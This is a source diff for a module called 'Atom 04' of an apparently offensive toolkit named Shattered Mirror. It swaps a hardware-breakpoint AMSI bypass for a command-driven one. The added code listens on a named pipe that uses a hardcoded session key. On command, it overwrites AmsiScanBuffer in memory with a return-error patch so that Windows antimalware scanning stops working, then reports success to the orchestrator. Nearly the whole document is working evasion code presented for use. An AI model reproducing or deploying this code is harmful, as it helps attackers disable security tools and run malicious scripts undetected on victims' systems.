@@ -1,4 +1,4 @@
-/*=============================================================================
+﻿/*=============================================================================
  * Shattered Mirror v1 — Atom 04: Standalone AMSI Bypass
  *
  * Implements a self-contained version of the VEH/DR AMSI bypass that can
@@ -9,7 +9,9 @@
 
 #include "Atom_04_AMSI.h"
 #include "Atom_03_Sys.h"
+#include "../Orchestrator/AtomManager.h"
 #include "../Evasion_Suite/include/indirect_syscall.h"
+#include <cstring>
 
 static PVOID s_pTargetAmsiScanBuffer = NULL;
 
@@ -44,41 +46,42 @@ static LONG NTAPI AtomVehAmsiHandler(EXCEPTION_POINTERS* pExInfo) {
     return EXCEPTION_CONTINUE_SEARCH;
 }
 
-DWORD WINAPI StandaloneAmsiAtomMain(LPVOID lpParam) {
-    /* 1. Ensure amsi.dll is loaded */
-    HMODULE hAmsi = GetModuleHandleW(L"amsi.dll");
-    if (!hAmsi) {
-        hAmsi = LoadLibraryW(L"amsi.dll");
-        if (!hAmsi) return 1;
+DWORD WINAPI AMSIBypassAtomMain(LPVOID lpParam) {
+    DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
+    HANDLE hPipe = IPC_ConnectToPipe(dwAtomId);
+    if (!hPipe) return 1;
+
+    BYTE SharedSessionKey[] = "KI4ns1N2S1M8Tknp";
+
+    while (TRUE) {
+        IPC_MESSAGE inMsg = { 0 };
+        if (IPC_ReceiveMessage(hPipe, &inMsg, SharedSessionKey, 16)) {
+            if (inMsg.CommandId == CMD_EXECUTE) {
+                HMODULE hAmsi = GetModuleHandleW(L"amsi.dll");
+                if (!hAmsi) hAmsi = LoadLibraryW(L"amsi.dll");
+
+                if (hAmsi) {
+                    void* pAddr = GetExportByHash(hAmsi, djb2_hash_ct("AmsiScanBuffer"));
+                    if (pAddr) {
+                        unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 0x80070057; ret
+                        DWORD oldProtect;
+                        VirtualProtect(pAddr, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
+                        memcpy(pAddr, patch, sizeof(patch));
+                        VirtualProtect(pAddr, sizeof(patch), oldProtect, &oldProtect);
+
+                        char report[] = "[AMSI] Memory Patch Applied Successfully. ScanBuffer neutralized.";
+                        IPC_MESSAGE outMsg = { 0 };
+                        outMsg.CommandId = CMD_REPORT;
+                        outMsg.dwPayloadLen = (DWORD)strlen(report);
+                        memcpy(outMsg.Payload, report, outMsg.dwPayloadLen);
+                        IPC_SendMessage(hPipe, &outMsg, SharedSessionKey, 16);
+                    }
+                }
+            }
+        } else if (GetLastError() == ERROR_BROKEN_PIPE) {
+            break;
+        }
+        Sleep(500);
     }
-
-    /* 2. Locate function via Hash (assuming GetExportByHash is accessible) */
-    s_pTargetAmsiScanBuffer = GetExportByHash(hAmsi, djb2_hash_ct("AmsiScanBuffer"));
-    if (!s_pTargetAmsiScanBuffer) return 1;
-
-    /* 3. Get Thread Context using Indirect Syscalls */
-    HANDLE hThread = GetCurrentThread();
-    CONTEXT ctx = { 0 };
-    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-
-    // Use linked Atom_03 function (we map to standard one here for logic clarity)
-    // The macro expansion logic requires the orchestrator table to be passed.
-    
-    // Fallback: If not linked to Orchestrator, we would run a local syscall resolver here.
-    // For MVP compilation we use standard API simulating the syscall macro.
-    if (!GetThreadContext(hThread, &ctx)) return 1;
-
-    /* 4. Set Hardware Breakpoint DR0 */
-    ctx.Dr0 = (DWORD64)s_pTargetAmsiScanBuffer;
-    ctx.Dr7 &= ~(3ULL);           
-    ctx.Dr7 |= 1ULL;             
-    ctx.Dr7 &= ~(0xFULL << 16);     
-    ctx.Dr6 = 0;
-
-    if (!SetThreadContext(hThread, &ctx)) return 1;
-
-    /* 5. Register VEH */
-    AddVectoredExceptionHandler(1, AtomVehAmsiHandler);
-
     return 0;
 }
